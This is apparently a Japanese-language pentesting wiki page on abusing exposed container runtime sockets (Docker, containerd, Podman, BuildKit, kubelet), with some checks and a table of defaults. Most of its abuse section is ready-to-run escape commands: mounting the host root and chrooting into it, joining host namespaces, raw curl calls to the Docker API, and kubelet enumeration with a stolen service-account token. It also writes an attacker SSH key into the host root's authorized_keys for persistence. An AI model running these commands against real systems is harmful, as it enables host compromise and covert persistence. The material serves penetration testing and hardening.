# Runtime API And Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Overview

実際の container 侵害の多くは、namespace escape から始まるわけではありません。runtime control plane へのアクセスから始まります。workload から、マウントされた Unix socket や公開された TCP listener を介して `dockerd`、`containerd`、CRI-O、Podman、または kubelet と通信できる場合、攻撃者は、より強い権限を持つ新しい container の作成、host filesystem のマウント、host namespace への参加、または node の機密情報の取得を要求できる可能性があります。このような場合、runtime API が実際の security boundary であり、これを compromise することは、機能的には host を compromise することに近い状態です。

このため、runtime socket exposure は kernel protections とは分けて記録すべきです。通常の seccomp、capabilities、MAC confinement が適用された container であっても、`/var/run/docker.sock` や `/run/containerd/containerd.sock` が内部にマウントされていれば、host compromise まで API call 1 回で到達できる可能性があります。現在の container に対する kernel isolation が設計どおりに機能していても、runtime management plane は完全に exposed のままになり得ます。

## Daemon Access Models

Docker Engine は従来、ローカル Unix socket の `unix:///var/run/docker.sock` を通じて privileged API を公開しています。過去には、`tcp://0.0.0.0:2375` のような TCP listener や、TLS で保護された `2376` の listener を通じて remote にも公開されていました。強力な TLS と client authentication なしで daemon を remote に公開すると、実質的に Docker API が remote root interface になります。

containerd、CRI-O、Podman、kubelet も同様に impact の大きい attack surface を公開しています。名称や workflow は異なりますが、logic は変わりません。interface によって caller が workload の作成、host path のマウント、credential の取得、または実行中の container の変更を行える場合、その interface は privileged management channel であり、それに応じて扱うべきです。

確認すべき一般的なローカル path は次のとおりです。
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
古い、またはより特殊な stack では、`dockershim.sock`、`frakti.sock`、`rktlet.sock` などの endpoint も公開されている場合があります。これらは現代の環境ではあまり一般的ではありませんが、見つかった場合は、通常の application socket ではなく runtime-control surface を表すものとして、同じ注意を払って扱う必要があります。

## Secure Remote Access

daemon を local socket の外部に公開する必要がある場合、接続は TLS で保護し、できれば mutual authentication を使用して、daemon が client を検証し、client が daemon を検証できるようにするべきです。利便性のために Docker daemon を plain HTTP で公開する古い習慣は、container administration における最も危険なミスの1つです。API surface は、privileged container を直接作成できるほど強力だからです。

Docker の過去の configuration pattern は次のようなものでした：
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemd-based hosts では、daemon の通信が `fd://` として現れることもあります。これは、プロセスが自ら直接 bind するのではなく、systemd から事前に開かれた socket を継承することを意味します。重要なのは正確な syntax ではなく、security consequence です。daemon が厳格に permission を設定した local socket を超えて listen した瞬間、transport security と client authentication は任意の hardening ではなく必須になります。

## Abuse

runtime socket が存在する場合は、それがどの socket なのか、互換性のある client が存在するか、raw HTTP または gRPC access が可能かを確認します。
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
これらのコマンドが有用なのは、存在しないパス、マウントされているもののアクセスできない socket、そして稼働中の特権 API を区別できるためです。client が成功した場合、次に確認すべきなのは、API が host bind mount または host namespace sharing を使用して新しい container を起動できるかどうかです。

### Client がインストールされていない場合

`docker`、`podman`、その他の使いやすい CLI が存在しないからといって、socket が安全とは限りません。Docker Engine は Unix socket 経由で HTTP を使用し、Podman は `podman system service` を通じて Docker-compatible API と Libpod-native API の両方を公開します。つまり、`curl` しかない最小構成の環境でも、daemon を操作するには十分な場合があります。
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
これは post-exploitation の際に重要です。defender が通常の client binaries を削除しても、management socket を mount したままにすることがあるためです。Podman hosts では、rootful と rootless の deployment で高価値な path が異なることに注意してください。rootful service instances では `unix:///run/podman/podman.sock`、rootless では `unix://$XDG_RUNTIME_DIR/podman/podman.sock` です。

### Full Example: Docker Socket To Host Root

`docker.sock` に到達できる場合、古典的な escape は host の root filesystem を mount した新しい container を起動し、その中で `chroot` することです：
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
これは Docker daemon を介して、host-root で直接実行する手段を提供します。影響はファイルの読み取りに限定されません。新しい container 内に侵入すると、攻撃者は host のファイルを改変し、credentials を収集し、persistence を埋め込み、追加の privileged workloads を起動できます。

### 完全な例: Docker Socket から Host Namespaces へ

攻撃者が filesystem のみへのアクセスではなく namespace entry を選ぶ場合:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
この経路では、現在の container を exploit するのではなく、runtime に明示的な host namespace exposure を指定して新しい container を作成させることで host に到達します。

### Docker Socket Persistence Pattern

Runtime control は、one-shot shell の代わりに persistence に使用することもできます。一般的なパターンは、host mount を持つ helper container を作成し、mount された host filesystem に authorized access material または startup hook を書き込み、その後 host がそれを利用することを validate するというものです。

例の形式：
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
同じ考え方は、operator が何を証明したいかに応じて、systemd units、cron fragments、application startup files、または SSH keys を対象にできます。重要なのは、persistent change が元の container 内の追加の privilege ではなく、runtime daemon の host-level filesystem authority を通じて行われる点です。

### Raw Docker API Helper Pivot

Docker CLI がない場合、同じ host-mount helper flow を Unix socket 経由の HTTP で実行できます。generic flow は、API を確認し、host bind mount を持つ helper container を作成し、それを起動し、exec instance を作成して、その exec を起動することです。
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
最終的な `/exec/<id>/start` リクエストは返された exec ID に依存しますが、security point は正確な JSON の処理方法とは無関係です。rootful Docker daemon への raw API access があれば、より強力な helper workload をリクエストできます。

### Full Example: containerd Socket

mount された `containerd` socket は通常、同様に危険です:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
より Docker に近い client が存在する場合、`nerdctl` は `ctr` より便利です。`--privileged`、`--pid=host`、`-v` などの使い慣れた flags が利用できるためです：
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
影響はここでもホスト侵害です。Docker固有の tooling が存在しない場合でも、別の runtime API が同じ管理権限を提供している可能性があります。Kubernetes ノードでは、`crictl` は CRI endpoint と直接通信するため、偵察や container とのやり取りにも十分利用できる場合があります。

### BuildKit Socket

`buildkitd` は「単なる build backend」と考えられがちなため見落とされやすいものの、daemon は依然として privileged control plane です。アクセス可能な `buildkitd.sock` によって、攻撃者は任意の build steps を実行し、worker の capabilities を調査し、侵害された環境の local contexts を使用し、daemon が許可するよう設定されている場合には `network.host` や `security.insecure` などの危険な entitlements を要求できる可能性があります。

最初に行うと有用な操作は次のとおりです。
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
daemon が build リクエストを受け付ける場合、insecure entitlements が利用可能かテストする:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
影響の正確な範囲は daemon の設定に依存しますが、許容的な entitlements を持つ rootful BuildKit service は、無害な developer convenience ではありません。特に CI runners や共有 build nodes では、別の高価値な管理用 attack surface として扱ってください。

### Kubelet API Over TCP

kubelet は container runtime ではありませんが、依然として node management plane の一部であり、同じ trust boundary の議論に含まれることがよくあります。workload から kubelet の secure port `10250` に到達できる場合、または node credentials、kubeconfigs、proxy rights が露出している場合、攻撃者は Kubernetes API server の admission path に一切触れることなく、Pods を列挙したり、logs を取得したり、node-local containers で commands を実行したりできる可能性があります。

まずは、簡単な discovery から始めます：
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
kubelet または API-server proxy の経路で `exec` が認可されている場合、WebSocket 対応クライアントによって、ノード上の他のコンテナでの code execution につなげることができます。これが、`get` 権限のみを持つ `nodes/proxy` が見た目以上に危険である理由でもあります。このリクエストは、コマンドを実行する kubelet エンドポイントにも到達でき、こうした kubelet への直接的な操作は通常の Kubernetes audit logs には記録されません。<sup>[[2]](#references)</sup>

## チェック

これらのチェックの目的は、コンテナが trust boundary の外部に置かれるべきだった管理プレーンへ到達できるかどうかを確認することです。
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
ここで興味深い点：

- マウントされた runtime socket は、単なる情報漏えいではなく、通常は直接的な管理操作の手段となる。
- TLS なしで `2375` を listen している TCP listener は、remote compromise の状態として扱うべきである。
- `DOCKER_HOST` などの環境変数は、その workload が host runtime と通信するよう意図的に設計されていることを示す場合が多い。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | デフォルトではローカル Unix socket | `dockerd` はローカル socket で listen し、daemon は通常 rootful | `/var/run/docker.sock` の mount、`tcp://...:2375` の公開、`2376` の TLS が弱いまたは存在しない |
| Podman | デフォルトでは Daemonless CLI | 通常のローカル利用では長時間稼働する特権 daemon は不要。ただし `podman system service` が有効な場合、API socket が公開されることがある | `podman.sock` の公開、service の広範な実行、rootful API の利用 |
| containerd | ローカルの特権 socket | 管理 API はローカル socket 経由で公開され、通常は高レベルの tooling から利用される | `containerd.sock` の mount、広範な `ctr` または `nerdctl` access、特権 namespace の公開 |
| CRI-O | ローカルの特権 socket | CRI endpoint は node-local の信頼された component 向けに設計されている | `crio.sock` の mount、CRI endpoint の untrusted workload への公開 |
| Kubernetes kubelet | Node-local management API | Kubelet は Pods から広範に到達可能にすべきではない。認証・認可によっては、access により pod state、credential、execution feature が公開される可能性がある | kubelet socket または cert の mount、弱い kubelet auth、host networking と到達可能な kubelet endpoint の併用 |

## References

- [1] [containerd socket exploitation パート 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server の bypass リスク](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
